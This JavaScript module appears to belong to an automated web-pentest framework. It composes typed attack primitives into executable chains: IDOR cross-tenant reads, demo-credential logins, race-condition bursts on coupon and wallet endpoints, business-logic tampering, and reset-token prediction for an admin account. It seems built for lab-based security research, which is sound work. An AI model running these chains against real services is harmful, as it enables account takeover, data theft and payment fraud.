// VARVEL — chaincompose: the typed-primitive COMPOSITION compiler (T2, build 1).
//
// Origin: the chainyard lab (docs/research/chainyard-lab-2026-08-29.md) proved the gap
// empirically — chainforge's vertical RULES compiled only the DECOY chain (cors-theft)
// because no bespoke rule modeled leak→predict→reset. This module is the horizontal
// complement: primitives declare typed provides/consumes slots, and composition is a
// SEARCH over primitive compatibility — fed through engine/pathsearch.mjs (UCT reused,
// not reimplemented) — rather than a hand-written rule per chain.
//
//   primitive = {
//     id, title,
//     provides: ['token-material', ...],   // typed outputs this primitive yields
//     consumes: ['token-material', ...],   // typed inputs it needs from EARLIER primitives
//     observes({endpoints, findings, material}) → { ok, gaps, ctx },  // surface fit (pure)
//     build(ctx, material) → { steps, impact? },                       // chainrun-shaped
//   }
//
// A composition is valid when each primitive's consumes are satisfied by the UNION of
// what earlier primitives provide. A chain is COMPLETE when its terminal primitive
// provides 'impact-data'. The compiler fires NO packets (chainforge doctrine) —
// satisfiability is checked against observed surface data; execution stays the
// governed decision (chainrun, which now carries the impact assertion).
//
// Output: { chains: [ {name, primitives, steps, impact, confidence, rationale} ],
//           search: {probes, activated}, gaps, honest }.
//
// House rules: pure + zero-dep; no fs, no network; hermetically testable. The
// chainforge module keeps its own contract untouched — this is a sibling, not a edit.

import { pathSearch } from './pathsearch.mjs';
import { TOKEN_SHAPES, SEED_EXTRACT_REGEXES } from './tokenshape.mjs';

const findEndpoint = (endpoints, re) => endpoints.find((e) => re.test(e.path || e.url || ''));
const hasFinding = (findings, re) => findings.find((f) => re.test(f.title || f.id || f.label || ''));

// ——— IDOR / ownership-confusion family (T2 fourth family) ———
// Object-route shapes the family recognizes (bykea-class: numeric sequential ids
// behind an identity boundary). Variants are emitted per OBSERVED route; the leak
// supplies the first-entry id/owner generically, so the variant whose family matches
// the leaked entry is the one that executes — the rest fail honestly at read time.
const ID_FAMILIES = [
  { id: 'booking', routeRe: /api\/bookings\/\d+/i },
  { id: 'invoice', routeRe: /api\/invoices\/\d+/i },
  { id: 'listing', routeRe: /api\/listings\/\d+/i },
  { id: 'order', routeRe: /api\/orders\/\d+/i },
  { id: 'profile', routeRe: /api\/profile[s]?\/[\w-]+/i },
];

// ——— race / TOCTOU family (T4) ———
// Single-use / limited-resource route shapes the family recognizes. Variants are
// emitted per OBSERVED route; resource refs (coupon codes, counterparties) are
// extracted from the docs surface at EXECUTION time, never hard-coded into a chain.
// The safe control (gift-claim) is deliberately mapped too: a properly locked
// endpoint composes, executes, and FAILS honestly (single-effect) — that honest
// failure is the control discipline, the same way the IDOR decoys fail at read-object.
const RACE_ROUTES = [
  { id: 'coupon-redeem', routeRe: /\/api\/coupons?\/redeem/i,
    method: 'POST', path: '/api/coupons/redeem', body: '{"code":"{{rc}}"}',
    resource: { var: 'rc', regex: 'Demo coupon[^<]*<code>([A-Z0-9-]+)' },
    readback: { path: '/api/coupons/{{rc}}', effect: '"redemptions":(\\d+)' },
    intended: 1, times: 6,
    note: 'single-use coupon: check "already redeemed?" …gap… record — concurrent submit redeems twice' },
  { id: 'wallet-transfer', routeRe: /\/api\/(wallet|balance)\/transfer/i,
    method: 'POST', path: '/api/wallet/transfer', body: '{"to":"{{peer}}","amount":60}',
    resource: { var: 'peer', regex: 'transfer to <code>(\\w+)' },
    readback: { path: '/api/wallet', effect: '"debits":(\\d+)' },
    intended: 1, times: 3,
    note: 'balance checked then debited — concurrent debits overdraw (balance goes negative)' },
  { id: 'giveaway-enter', routeRe: /\/api\/(giveaway|contest|raffle)\/(enter|join)/i,
    method: 'POST', path: '/api/giveaway/enter', body: '{}',
    resource: null,
    readback: { path: '/api/giveaway', effect: '"yourEntries":(\\d+)' },
    intended: 1, times: 6,
    note: 'per-tenant entry limit — parallelism bypasses the count check' },
  { id: 'gift-claim', routeRe: /\/api\/gifts?\/claim/i,
    method: 'POST', path: '/api/gift/claim', body: '{"code":"{{gc}}"}',
    resource: { var: 'gc', regex: 'Demo gift[^<]*<code>([A-Z0-9-]+)' },
    readback: { path: '/api/gifts/{{gc}}', effect: '"claims":(\\d+)' },
    intended: 1, times: 6,
    note: 'claim-once shape — if the endpoint is properly locked/idempotent this chain FAILS honestly (single-effect verdict), which is exactly the control clearing a naive flag' },
];

// ——— business-logic invariant family (T3) ———
// Route shapes whose specs declare checkable invariants. Variants are emitted per
// OBSERVED route + an observed spec document; the invariant step fetches the spec AT
// EXECUTION TIME and extracts the candidate (engine/logicinvariants.mjs) — the chain
// carries no hard-coded violation, only the kind + the route. Safe/enforced routes
// are mapped deliberately: they compose, execute, and FAIL honestly (verdict
// enforced), the same control discipline as the race family's gift-claim.
const INVARIANT_ROUTES = [
  { id: 'payment-negative', routeRe: /\/api\/(safe\/)?payments$/i, kind: 'bounds-min', method: 'POST',
    note: 'amount has a schema minimum — probe below it; a negative debit is a CREDIT' },
  { id: 'order-price-tamper', routeRe: /\/api\/(safe\/)?orders$/i, kind: 'server-authoritative', method: 'POST',
    note: 'price is server-authoritative per spec — tamper it and read back what was actually charged' },
  { id: 'booking-seat-overrun', routeRe: /\/api\/(safe\/)?bookings$/i, kind: 'bounds-max', method: 'POST',
    note: 'seats has a schema maximum (capacity) — probe above it and read back the booked count' },
  { id: 'checkout-step-skip', routeRe: /\/api\/(safe\/)?checkout\/confirm/i, kind: 'flow-order', method: 'POST',
    note: 'x-flows declares an ordered checkout — invoke the terminal step without the payment step' },
  { id: 'coupon-stacking', routeRe: /\/api\/(safe\/)?coupons\/apply/i, kind: 'usage-limit', method: 'POST',
    note: 'x-limit per order — apply a second distinct coupon and read back the count' },
  { id: 'ride-role-confusion', routeRe: /\/api\/(safe\/)?rides\/[\w-]+\/status/i, kind: 'role-gate', method: 'PATCH',
    note: 'x-role driver — a passenger session drives the ride state machine' },
  { id: 'order-backward-cancel', routeRe: /\/api\/(safe\/)?orders\/[\w-]+\/cancel/i, kind: 'state-machine', method: 'POST',
    note: 'x-state-machines bounds cancel to pending/paid — cancel a DELIVERED order and read back its state' },
  { id: 'self-referral', routeRe: /\/api\/(safe\/)?referrals$/i, kind: 'actor-separation', method: 'POST',
    note: 'x-distinct-actors — redeem your OWN referral code (resolved at runtime) and read back the credit' },
];

// ——— the primitive library ———
// Deliberately small: each entry is a reusable offensive PRIMITIVE, not a per-target
// rule. New primitives are research output (hypothesis log + pinned test), like new
// token shapes.
export const PRIMITIVES = [
  {
    id: 'enumerable-id-leak',
    title: 'Activity/feed surface leaks enumerable object ids + owning tenants',
    provides: ['object-ids'],
    consumes: [],
    observes({ endpoints, findings }) {
      const ep = findEndpoint(endpoints, /api\/(feed|activity|recent)/i)
        || (hasFinding(findings, /enumerat|activity feed|leaks?.*\bids?\b/i) && findEndpoint(endpoints, /feed|activity/i));
      const gaps = ep ? [] : ['no id-leaking feed/activity endpoint observed'];
      return { ok: !gaps.length, gaps, ctx: { feedPath: ep && (ep.path || ep.url) } };
    },
    build({ feedPath }) {
      return {
        steps: [{
          id: 'leak-ids', path: feedPath, expect: { status: 200 },
          extract: {
            fam: { regex: '"type":"(\\w+)"' },     // first entry's object family
            oid: { regex: '"id":(\\d{3,})' },      // first entry's object id
            owner: { regex: '"tenant":"(\\w+)"' }, // first entry's OWNING tenant (the victim identity)
          },
          note: 'the leak carries ids + owners but NO object content — informational alone; it is the composition point',
        }],
        exports: ['fam', 'oid', 'owner'],
      };
    },
  },
  {
    id: 'published-creds-login',
    title: 'Published/demo credentials establish a low-priv authenticated session',
    provides: ['authenticated-session'],
    consumes: [],
    observes({ endpoints, findings }) {
      const login = findEndpoint(endpoints, /^\/login$/i);
      const docs = findEndpoint(endpoints, /\/(docs|sandbox|help|readme)/i)
        || (hasFinding(findings, /published|demo|default cred/i) ? login : null);
      const gaps = [];
      if (!login) gaps.push('no login endpoint observed');
      if (!docs) gaps.push('no docs/sandbox surface likely to publish demo creds');
      return { ok: !gaps.length, gaps, ctx: { loginPath: login && (login.path || login.url), docsPath: docs && (docs.path || docs.url) || (login && (login.path || login.url)) } };
    },
    build({ loginPath, docsPath }) {
      const steps = [];
      if (docsPath && docsPath !== loginPath) {
        steps.push({ id: 'read-docs', path: docsPath, expect: { status: 200 },
          extract: {
            tenantUser: { regex: '[Tt]enant demo account:\\s*<code>(\\w+)' },
            tenantPass: { regex: '[Tt]enant demo account:\\s*<code>\\w+\\s*\\/\\s*([\\w-]+)' },
          },
          note: 'extract the published low-priv credentials (docs/sandbox pages publish them realistically)' });
      }
      steps.push({ id: 'login', method: 'POST', path: loginPath,
        form: { user: '{{tenantUser}}', pass: '{{tenantPass}}' },
        expect: { status: 302 },
        extract: { authcookie: { header: 'set-cookie', regex: '([^;]+)' } },
        note: 'low-priv session — generic Set-Cookie capture, no app-specific cookie name' });
      return { steps, exports: ['authcookie'] };
    },
  },
  {
    id: 'ownership-confusion',
    title: 'Cross-tenant object read (IDOR/BOLA) via leaked id + low-priv session',
    provides: ['impact-data'],
    consumes: ['object-ids', 'authenticated-session'],
    variants({ endpoints }) {
      return ID_FAMILIES
        .filter((f) => endpoints.some((e) => f.routeRe.test(e.path || e.url || '')))
        .map((f) => {
          const ep = endpoints.find((e) => f.routeRe.test(e.path || e.url || ''));
          return { id: f.id, family: f, objectPath: (ep.path || ep.url).replace(/\d{3,}|(?<=\/)[\w-]{8,}$/, '{{oid}}') };
        });
    },
    observes({ endpoints, findings }) {
      const any = ID_FAMILIES.some((f) => endpoints.some((e) => f.routeRe.test(e.path || e.url || '')));
      const hinted = hasFinding(findings, /idor|bola|ownership|cross-tenant/i);
      const gaps = any || hinted ? [] : ['no numeric-id object route observed (bookings/invoices/orders/profile shape)'];
      return { ok: !gaps.length, gaps, ctx: {} };
    },
    build(ctx) {
      const { objectPath, family } = ctx.shape;
      return {
        steps: [{
          id: 'read-object', path: objectPath, headers: { cookie: '{{authcookie}}' },
          expect: { status: 200, contains: '{{owner}}' },
          note: `cross-tenant read of the leaked ${family.id} id — the response must carry the OTHER tenant's identity (extracted from the leak, not assumed)`,
        }],
        exports: [],
        impact: {
          step: 'read-object',
          contains: '{{owner}}', // the victim tenant's identity IN the object proves the boundary crossed
          control: { stripHeaders: ['cookie', 'authorization'], refuseStatus: [401, 403], mustDiffer: true },
        },
      };
    },
  },
  {
    id: 'race-window',
    title: 'Single-use/limited resource consumed more than once via synchronized concurrency (TOCTOU)',
    provides: ['impact-data'],
    consumes: ['authenticated-session'],
    variants({ endpoints }) {
      const docs = findEndpoint(endpoints, /\/(docs|sandbox|help|readme)/i);
      return RACE_ROUTES
        .filter((r) => endpoints.some((e) => r.routeRe.test(e.path || e.url || '')))
        .filter((r) => !r.resource || docs) // resource-bearing variants need a docs surface to parameterize from — else the chain could only hard-code a victim resource (dishonest)
        .map((r) => ({ ...r, docsPath: docs && (docs.path || docs.url) }));
    },
    observes({ endpoints }) {
      const any = RACE_ROUTES.some((r) => endpoints.some((e) => r.routeRe.test(e.path || e.url || '')));
      const gaps = any ? [] : ['no single-use/limited-resource route observed (redeem/transfer/enter/claim shape)'];
      return { ok: !gaps.length, gaps, ctx: {} };
    },
    build(ctx) {
      const kind = ctx.shape;
      const steps = [];
      if (kind.resource) {
        steps.push({
          id: 'read-resource', path: kind.docsPath || '/docs', expect: { status: 200 },
          extract: { [kind.resource.var]: { regex: kind.resource.regex } },
          note: 'extract the demo resource ref the docs publish — the chain parameterizes itself; extraction failure stops it honestly',
        });
      }
      steps.push({
        id: 'race-fire',
        race: {
          method: kind.method, path: kind.path,
          headers: { cookie: '{{authcookie}}', 'content-type': 'application/json' },
          body: kind.body, times: kind.times, attempts: 3, intended: kind.intended,
          resetPath: '/lab/revert', resetBody: '{"scope":"race"}',
          readback: kind.readback,
        },
        expect: { contains: '"verdict":"raced"' },
        note: `last-byte-sync burst (${kind.times} parallel) against a sequential-replay control; the verdict comes from STATE READBACK, never status codes — ${kind.note}`,
      });
      return {
        steps,
        exports: [],
        impact: {
          step: 'race-fire',
          contains: '"verdict":"raced"', // the duplicated effect IS the impact; the sequential control lives INSIDE the race step
        },
      };
    },
  },
  {
    id: 'invariant-violation',
    title: 'Business-logic invariant violated (spec-declared bound/flow/role/limit not enforced server-side)',
    provides: ['impact-data'],
    consumes: ['authenticated-session'],
    variants({ endpoints, material }) {
      const specEp = findEndpoint(endpoints, /\/(openapi\.json|swagger\.json|api-docs)/i);
      // Traffic-discovered candidates (engine/logicdiscover.mjs) can substitute for
      // the spec entirely — they carry their own control/violation/readback.
      const discovered = (material && Array.isArray(material.discoveredInvariants)) ? material.discoveredInvariants : [];
      if (!specEp && !discovered.length) return []; // no spec, no discovered candidates → withhold honestly
      const sameSurface = (a, b) => (/^\/api\/safe\//.test(a) === /^\/api\/safe\//.test(b));
      const tplTest = (r, p) => r.routeRe.test(String(p || '').replace(/\{\{[^}]+\}\}/g, 'x'));
      return INVARIANT_ROUTES.flatMap((r) =>
        endpoints
          .filter((e) => r.routeRe.test(e.path || e.url || ''))
          .map((ep) => {
            const p = ep.path || ep.url;
            const disc = discovered.find((c) => c && c.kind === r.kind && tplTest(r, c.path) && sameSurface(c.path || '', p));
            if (!specEp && !disc) return null; // no spec AND no discovered candidate for this route
            return { ...r, id: r.id + (/^\/api\/safe\//.test(p) ? ':safe' : ''), observedPath: p, specDocPath: specEp ? (specEp.path || specEp.url) : null, candidate: disc || null };
          })
          .filter(Boolean));
    },
    observes({ endpoints, material }) {
      const any = INVARIANT_ROUTES.some((r) => endpoints.some((e) => r.routeRe.test(e.path || e.url || '')));
      const specEp = findEndpoint(endpoints, /\/(openapi\.json|swagger\.json|api-docs)/i);
      const discovered = (material && Array.isArray(material.discoveredInvariants)) ? material.discoveredInvariants : [];
      const gaps = [];
      if (!any) gaps.push('no logic-bearing route observed (orders/payments/bookings/coupons/referrals shape)');
      if (!specEp && !discovered.length) gaps.push('no API spec document observed (openapi.json shape) and no traffic-discovered invariants supplied — invariants need one of the two');
      return { ok: !gaps.length, gaps, ctx: {} };
    },
    build(ctx) {
      const kind = ctx.shape;
      return {
        steps: [{
          id: 'probe-invariant',
          invariant: {
            kind: kind.kind, path: kind.observedPath, method: kind.method,
            ...(kind.candidate ? { candidate: kind.candidate } : {}),
            ...(kind.specDocPath ? { specPath: kind.specDocPath } : {}),
            headers: { cookie: '{{authcookie}}' },
            resetPath: '/lab/revert',
          },
          expect: { contains: '"verdict":"violated"' },
          note: kind.candidate
            ? `traffic-discovered invariant probe (engine/logicdiscover.mjs — no spec involved): ${kind.note}. Verdict comes from a control request + STATE readback, never the violation's status code`
            : `spec-extracted invariant probe: ${kind.note}. Verdict comes from a control request + STATE readback, never the violation's status code`,
        }],
        exports: [],
        impact: {
          step: 'probe-invariant',
          contains: '"verdict":"violated"', // the materialized attacker-chosen effect IS the impact; the control lives inside the probe
        },
      };
    },
  },
  {
    id: 'leaked-token-material',
    title: 'State leak exposes token material (seed/secret)',
    provides: ['token-material'],
    consumes: [],
    observes({ endpoints, findings }) {
      const ep = findEndpoint(endpoints, /(internal\/)?(debug|diag|status\/full|info\/state)/i)
        || (hasFinding(findings, /debug|info-?leak|seed|state leak/i) && findEndpoint(endpoints, /debug|internal/i));
      const gaps = ep ? [] : ['no state-leak endpoint observed (debug/diag surface)'];
      return { ok: !gaps.length, gaps, ctx: { leakPath: ep && (ep.path || ep.url) } };
    },
    build({ leakPath }) {
      return {
        steps: [{
          id: 'observe-leak', path: leakPath, expect: { status: 200 },
          extract: { seed: { regex: SEED_EXTRACT_REGEXES[0] } },
          note: 'extract the leaked token material; if extraction fails the chain stops honestly (try the next shape/regex variant)',
        }],
        exports: ['seed'],
      };
    },
  },
  // One primitive FAMILY, expanded per token-shape hypothesis by composeChains —
  // the shape is the unknown; execution is the oracle that picks the winner.
  {
    id: 'predictable-reset-token',
    title: 'Reset/invite token derivable from leaked material',
    provides: ['auth-as-user'],
    consumes: ['token-material'],
    shapes: TOKEN_SHAPES, // per-shape variants emitted during expansion
    observes({ endpoints }) {
      const req = findEndpoint(endpoints, /(reset|forgot|invite)\/(request|begin|start)/i) || findEndpoint(endpoints, /(reset|forgot|invite)/i);
      const cfm = findEndpoint(endpoints, /(reset|forgot|invite)\/(confirm|complete|consume|finish)/i);
      const gaps = [];
      if (!req) gaps.push('no token-issuing endpoint observed (reset/request shape)');
      if (!cfm) gaps.push('no token-consuming endpoint observed (reset/confirm shape)');
      return { ok: !gaps.length, gaps, ctx: { requestPath: req && (req.path || req.url), confirmPath: cfm && (cfm.path || cfm.url) } };
    },
    build({ requestPath, confirmPath, shape }, material = {}) {
      const user = material.targetUser || 'admin'; // hypothesis: the high-value account name
      const token = shape.render({ seed: '{{seed}}', user });
      const steps = [
        { id: 'request-token', method: 'POST', path: requestPath, body: JSON.stringify({ user }),
          expect: { status: 200 }, note: `issue a token for ${user}; the response must NOT contain it (delivery out-of-band) — prediction, not leakage, is the claim` },
        { id: 'consume-token', method: 'POST', path: confirmPath,
          body: JSON.stringify({ user, token, password: material.resetPassword || 'chaincompose-pw-1' }),
          expect: { status: 200 },
          extract: { authcookie: { header: 'set-cookie', regex: '([^;]+)' } },
          note: `shape hypothesis '${shape.id}' (${shape.label}); a 403 here refutes this shape — the executor stops and the next candidate runs` },
      ];
      const revert = material.revertPath
        || (findEndpoint(material.endpoints || [], /lab\/revert|\/revert$/i) || {}).path;
      if (revert) steps.push({ id: 'revert', method: 'POST', path: revert, expect: { status: 200 }, note: 'restore planted state — net target change zero' });
      return { steps, exports: ['authcookie'] };
    },
  },
  {
    id: 'protected-data-read',
    title: 'Authenticated read of role-gated data',
    provides: ['impact-data'],
    consumes: ['auth-as-user'],
    observes({ endpoints }) {
      const ep = findEndpoint(endpoints, /admin\/(vault|data|users|panel)|\/vault|internal\/data/i)
        || findEndpoint(endpoints, /^\/admin$/i);
      const gaps = ep ? [] : ['no role-gated data endpoint observed (admin/vault shape)'];
      return { ok: !gaps.length, gaps, ctx: { dataPath: ep && (ep.path || ep.url) } };
    },
    build({ dataPath }, material = {}) {
      const impact = {
        step: 'read-protected',
        // Generic impact oracle (no target-specific canary knowledge): the authed read
        // must succeed while the SAME request stripped of auth is REFUSED and DIFFERS.
        control: { stripHeaders: ['cookie', 'authorization'], refuseStatus: [401, 403], mustDiffer: true },
      };
      if (material.impactMarker) impact.contains = material.impactMarker;
      return {
        steps: [{ id: 'read-protected', path: dataPath, headers: { cookie: '{{authcookie}}' },
          expect: { status: 200 }, note: 'the data the composed auth-as-user identity can reach' }],
        exports: [],
        impact,
      };
    },
  },
];

const TERMINAL_TYPE = 'impact-data';

// ——— the composition search ———
// pathsearch is fed the PRIMITIVE graph: expand() emits compatible next primitives,
// probe() is a hermetic compile-check (satisfiability against observed surface — no
// packets), classify() maps compile-checks onto pathsearch's value table so UCT
// concentrates on chains that both fit the surface AND reach impact.
export async function composeChains({ endpoints = [], findings = [], material = {}, maxChains = 12, maxProbes = 200 } = {}) {
  const ctxCache = new Map();
  const fit = (primId) => {
    if (!ctxCache.has(primId)) {
      const p = PRIMITIVES.find((x) => x.id === primId);
      ctxCache.set(primId, p ? p.observes({ endpoints, findings, material }) : { ok: false, gaps: ['unknown primitive'] });
    }
    return ctxCache.get(primId);
  };

  // Expansion: descriptor = { prim, shape?, variant?, provided, path: [prim ids] }.
  const expand = (d, depth) => {
    const provided = new Set(d.provided || []);
    const inPath = new Set(d.path || []);
    // A chain that already reached impact-data is COMPLETE — terminals don't expand.
    if (depth > 0 && provided.has(TERMINAL_TYPE)) return [];
    const out = [];
    for (const p of PRIMITIVES) {
      if (inPath.has(p.id)) continue;                       // no primitive twice in one chain
      if (!p.consumes.every((c) => provided.has(c))) continue; // typed compatibility
      const f = fit(p.id);
      // Variants: static shape libraries (token shapes) OR surface-derived variant
      // providers (ownership-confusion emits one variant per observed object route).
      const variants = p.shapes || (typeof p.variants === 'function' ? p.variants({ endpoints, findings, material }) : [null]);
      for (const variant of variants) {
        out.push({
          prim: p.id, shape: variant ? variant.id : null, variant: variant || null,
          provided: [...provided, ...p.provides],
          path: [...(d.path || []), p.id],
          terminal: p.provides.includes(TERMINAL_TYPE),
          satisfiable: f.ok && variants.length > 0,
          gaps: f.gaps,
        });
      }
    }
    return out;
  };

  // Hermetic probe: score the descriptor's compile fitness. Terminal + satisfiable
  // scores like a proven write; satisfiable mid-chain scores reachable; an unfit
  // primitive scores as dead (pruned below the floor).
  const probe = async (d) => ({ satisfiable: d.satisfiable, terminal: d.terminal });
  const classify = (r) => {
    if (!r || !r.satisfiable) return { cls: 'not-found', base: 0.05 };
    if (r.terminal) return { cls: 'writable', base: 0.97 };  // a complete, surface-fit chain
    return { cls: 'reachable', base: 0.55 };
  };

  // minCrediblePaths: 1 — composition value is ORDERING, not discovery breadth; a
  // single strong root (the leak) must still drive the search to its terminals.
  const res = await pathSearch({ prim: '__root__', provided: [], path: [] }, {
    expand, probe, classify, maxDepth: 5, maxProbes, breadth: 12, minCrediblePaths: 1, credibleAt: 0.4, pruneFloor: 0.15,
  });

  // Compile complete chains from the search tree: root→leaf paths that end terminal.
  const chains = [];
  const seen = new Set();
  const walk = (n, acc) => {
    for (const k of n.children) {
      if (k.pruned) continue;
      const here = [...acc, k.descriptor];
      if (k.descriptor.terminal) {
        // Canonical dedupe: independent middle primitives can compose in any ORDER
        // (leak→login→read ≡ login→leak→read); keep one representative per chain.
        const parts = here.map((d) => d.prim + (d.shape ? ':' + d.shape : ''));
        const key = [...parts.slice(0, -1).sort(), parts[parts.length - 1]].join('→');
        // Dead-weight filter: every non-terminal primitive must PROVIDE a type some
        // LATER primitive in the chain consumes — else it is an irrelevant prefix
        // (a leak that feeds nothing downstream is noise, not composition).
        const relevant = here.every((d, i) => {
          const p = PRIMITIVES.find((x) => x.id === d.prim);
          if (p.provides.includes(TERMINAL_TYPE)) return true;
          return p.provides.some((t) => here.slice(i + 1).some((ld) => PRIMITIVES.find((x) => x.id === ld.prim).consumes.includes(t)));
        });
        if (relevant && !seen.has(key)) { seen.add(key); chains.push(compile(here, { endpoints, findings, material })); }
      }
      walk(k, here);
    }
  };
  walk(res.tree, []);

  // Honest gap report: which primitives didn't fit the surface at all.
  const gaps = PRIMITIVES
    .map((p) => ({ primitive: p.id, fit: fit(p.id) }))
    .filter((g) => !g.fit.ok)
    .map((g) => ({ primitive: g.primitive, missing: g.fit.gaps }));

  chains.sort((a, b) => a.requestsEstimate - b.requestsEstimate);
  return {
    chains: chains.slice(0, maxChains),
    search: { probes: res.probes, activated: res.activated, reason: res.reason || null },
    gaps,
    honest: chains.length
      ? `composed ${chains.length} candidate chain(s) from typed primitives over observed surface data — execution (with impact assertion) is the oracle`
      : 'no complete primitive composition fits the observed surface (honest empty, not a hallucinated plan)',
  };
}

// Assemble one chainrun-shaped chain document from a primitive path.
function compile(descs, { endpoints, findings, material }) {
  const ids = [];
  let impact = null;
  const mainSteps = [];
  const cleanupSteps = [];
  for (const d of descs) {
    const p = PRIMITIVES.find((x) => x.id === d.prim);
    const ctx = { ...p.observes({ endpoints, findings, material }).ctx };
    if (d.shape) ctx.shape = d.variant || (p.shapes || []).find((s) => s.id === d.shape);
    const built = p.build(ctx, { ...material, endpoints });
    // Cleanup/hygiene steps belong at the END of the composed chain (after the impact
    // read), regardless of which primitive contributed them.
    for (const s of built.steps) (s.id === 'revert' ? cleanupSteps : mainSteps).push(s);
    if (built.impact) impact = built.impact; // terminal primitive owns the impact assertion
    ids.push(d.prim + (d.shape ? ':' + d.shape : ''));
  }
  const steps = [...mainSteps, ...cleanupSteps];
  return {
    name: 'composed:' + ids.join('→'),
    primitives: ids,
    steps,
    ...(impact ? { impact } : {}),
    requestsEstimate: steps.length,
    confidence: 'composed-candidate (surface-fit; unproven until executed with impact assertion)',
    rationale: 'typed composition: ' + ids.join(' → '),
  };
}

// ——— validator hookup (build 4, minimal) ———
// A composed chain that EXECUTED with impact proven becomes a finding whose evidence
// cites the validator's objective-oracle vocabulary: a governed tool ref (chainrun), a
// reproduction summary, a control comparison, and any marker read back. The ingest
// gate (hasObjectiveOracle) then lets it hold the confirmed tier — see
// test/chaincompose.test.mjs for the pinned contract.
export function findingFromChain(run, { title, sev = 'high', hostRef } = {}) {
  if (!run || !run.ok || !run.impact || !run.impact.ok) {
    return { error: 'chain did not execute with impact proven — no finding (honest refusal)', run: run ? { ok: run.ok, impact: run.impact || null } : null };
  }
  const stepLines = run.steps.map((s) => `${s.method || 'GET'} ${s.path} → ${s.status} (${s.id})`).join('; ');
  // Describe the control that ACTUALLY ran: auth-strip re-fire for request chains,
  // the sequential-replay control inside the probe for race chains. Never claim a
  // control that didn't happen.
  const raceStep = run.steps.find((s) => s.race);
  const logicStep = run.steps.find((s) => s.invariant);
  const controlLine = raceStep
    ? `Control comparison: sequential replay of the identical requests on fresh state held the invariant (effect ${raceStep.race.seqEffect}); the synchronized burst violated it (effect ${raceStep.race.parEffect}) — reproduction rate ${raceStep.race.rate}.`
    : logicStep
    ? `Control comparison: a spec-valid control request succeeded (endpoint usable by this session) while the spec-violating request left the attacker-chosen effect in the state readback — invariant kind ${logicStep.invariant.kind}.`
    : `Control comparison: ${run.impact.step} re-requested without auth headers — refused/differed as required.`;
  return {
    title: title || run.chain,
    sev,
    ref: hostRef || run.base + (run.steps[run.steps.length - 1] || {}).path,
    confidence: 90,
    evidence:
      `chainrun reproduction: ${run.stepsCompleted}/${run.stepsTotal} steps completed (${stepLines}). ` +
      `Impact assertion held: ${run.impact.detail}. ` +
      controlLine,
  };
}
